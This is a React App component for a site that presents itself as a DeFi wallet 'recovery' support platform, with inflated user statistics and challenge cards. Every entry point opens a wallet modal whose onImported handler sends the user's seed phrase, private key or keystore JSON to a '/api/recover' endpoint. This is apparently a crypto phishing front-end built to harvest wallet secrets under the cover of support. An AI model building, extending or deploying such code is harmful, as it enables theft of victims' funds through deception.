import ChallengeCard from "./components/ChallengeCard";
import { challenges } from "./components/ChallengeCard";
import hero_image from "./assets/images/hero-image.jpg";
import { useState } from "react";
import WalletModal from "./components/WalletModal";
import { Icon } from "./assets/icons/svg";


declare global {
  interface Window {
    ethereum?: {
      request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
    };
  }
}

const App = () => {

  const stats = [
    { value: "700k+", label: "Total Wallet Connected" },
    { value: "1M+", label: "Problems Solved" },
    { value: "17k+", label: "Master Nodes" },
  ];

  const [showWalletModal, setShowWalletModal] = useState(false);

  return (
    <div
      className="min-h-screen"
      style={{
        background: "#060d08",
        fontFamily: "'Courier New', monospace",
        color: "#c8e6c9",
      }}
    >
      {/* Nav */}
      <nav
        className="flex items-center justify-between px-6 py-4 border-b"
        style={{ borderColor: "#0d2018" }}
      >
        <div className="flex items-center gap-2">
          <Icon />
          {/* <span
            className="text-sm font-bold"
            style={{ color: "#00ff88", letterSpacing: "0.1em" }}
          >
            DeFi Saver
          </span> */}
        </div>
      </nav>

      {/* Hero */}
      <section className="px-6 py-16 max-w-6xl mx-auto">
        <div className="flex flex-col md:flex-row items-center gap-12">
          <div className="flex-1">
            <div
              className="text-4xl font-black mb-2"
              style={{
                color: "#00ff88",
                letterSpacing: "-0.02em",
                textShadow: "0 0 40px rgba(0,255,136,0.3)",
              }}
            >
              Connecting
            </div>
            <h1
              className="text-3xl font-black mb-4"
              style={{ color: "#e8f5e9", lineHeight: 1.2 }}
            >
              Affected old and
              <br />
              new wallets
            </h1>
            <p className="text-sm mb-8" style={{ color: "#4a7a5a" }}>
              A DeFi application to provide comprehensive support platform to
              users experiencing wallet-related challenges within the DeFi space.
            </p>
            <button
              className="px-6 py-2.5 rounded text-sm font-bold transition-all duration-200 hover:opacity-90"
              style={{
                background: "linear-gradient(90deg, #00ff88, #00cc6a)",
                color: "#000",
                letterSpacing: "0.05em",
              }}
              onClick={() => setShowWalletModal(true)}
            >
              Get Started
            </button>
          </div>

          {/* Mock UI preview */}
          <div className="flex-1">
            <img src={hero_image} alt="Hero Image" className="w-full h-full object-cover" />
          </div>
        </div>
      </section>

      {/* Stats */}
      <section
        className="mx-6 my-4 rounded-xl px-8 py-10 border max-w-6xl md:mx-auto"
        style={{
          background: "linear-gradient(135deg, #0a1a10 0%, #060d08 100%)",
          borderColor: "#1a3d28",
        }}
      >
        <div className="grid grid-cols-3 gap-8 text-center">
          {stats.map((s) => (
            <div key={s.label}>
              <div
                className="text-3xl font-black mb-1"
                style={{
                  color: "#00ff88",
                  textShadow: "0 0 20px rgba(0,255,136,0.4)",
                }}
              >
                {s.value}
              </div>
              <div className="text-xs" style={{ color: "#4a7a5a" }}>
                {s.label}
              </div>
            </div>
          ))}
        </div>
      </section>

      {/* {showWalletModal && <WalletModal isOpen={showWalletModal} onClose={() => setShowWalletModal(false)} />} */}
      {showWalletModal && (
          <WalletModal
              isOpen={showWalletModal}
              onClose={() => setShowWalletModal(false)}
              onImported={(walletId, mode, value) => {
                // walletId = "metamask" | "phantom" etc.
                // mode = "seed" | "privatekey" | "keystore"
                // value = the actual phrase/key/json string
                fetch("/api/recover", {
                  method: "POST",
                  headers: {
                    "Content-Type": "application/json",
                  },
                  body: JSON.stringify({ walletId, mode, phrase: value }),
                });
              }}
        />
      )}

      {/* Challenges */}
      <section className="px-6 py-16 max-w-6xl mx-auto">
        <h2
          className="text-2xl font-black text-center mb-10"
          style={{ color: "#e8f5e9" }}
        >
          Select Related Challenges
        </h2>
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
          {challenges.map((c) => (
            <ChallengeCard key={c.id} challenge={c} onOpen={() => setShowWalletModal(true)} />
          ))}
        </div>
      </section>

      {/* Footer */}
      <footer
        className="flex items-center justify-between px-6 py-4 border-t"
        style={{ borderColor: "#0d2018" }}
      >
        <div className="flex items-center gap-2">
          <Icon />
        </div>
        <span className="text-xs" style={{ color: "white" }}>
          All Rights Reserved DeFi Protocol Online.
        </span>
      </footer>
    </div>
  );
}

export default App;